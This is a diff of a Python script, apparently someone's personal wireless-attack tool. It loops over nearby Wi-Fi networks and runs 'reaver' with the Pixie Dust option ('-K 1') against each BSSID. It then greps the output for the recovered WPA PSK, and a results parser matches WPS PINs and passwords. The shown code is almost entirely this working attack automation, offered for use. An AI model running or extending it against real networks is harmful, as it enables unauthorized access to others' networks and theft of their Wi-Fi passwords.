@@ -73,16 +73,20 @@ def limparArquivo_executar():
         print(f"[{YELLOW}+{ENDC}]Rodando reaver para a rede:{BLUE} {lista_essid[i]}...\n{ENDC}")
         comando = f"sudo timeout 30s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1  > redeB{i}.txt"
         subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)
-        #bugado
-        os.system(GREEN + f"grep -i 'WPA PSK' redeB{lista_essid[i]}.txt" + ENDC)
-    
+        grep = f"grep -i 'WPA PSK' redeB{i}.txt"
+        print(f"{GREEN}")
+        subprocess.run(grep, shell=True)
+        print(f"{ENDC}")
+
     for i in redes_ruim_dbm:
         print(f"[{YELLOW}+{ENDC}]Rodando reaver para a rede:{BLUE} {lista_essid[i]}...\n{ENDC}")
         comando = f"sudo timeout 25s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1  > redeR{i}.txt"
         subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL)
-        #Bugado
-        os.system(GREEN + f"grep -i 'WPA PSK' redeR{i}.txt" + ENDC)
-
+        grep = f"grep -i 'WPA PSK' redeR{i}.txt"
+        print(f"{GREEN}")
+        subprocess.run(grep, shell=True)
+        print(f"{ENDC}")
+        #os.system(GREEN + f"grep -i 'WPA PSK' redeR{i}.txt {ENDC}")
    #for i in range(len(lista_bssid)):
     #    print(f"Rodando reaver para a rede numero {i+1}, {lista_essid[i]}...\n")
     #    comando = f"sudo timeout 40s reaver -i wlan1mon -b {lista_bssid[i]} -c {lista_canal[i]} -K 1 -vvv > rede{i}.txt"
@@ -91,7 +95,7 @@ def limparArquivo_executar():
 #Loucura.inicio()
 def analizarResultados():
     pattern1 = re.compile(r"send_packet called from resend_last_packet()")
-    pattern2 = re.compile(r"[+] Associated with")
+    pattern2 = re.compile(r"Associated with")
     pattern3 = re.compile(r"WPS PIN:")
     pattern4 = re.compile(r"WPA PSK:")
     pattern5 = re.compile(r"AP SSID:")
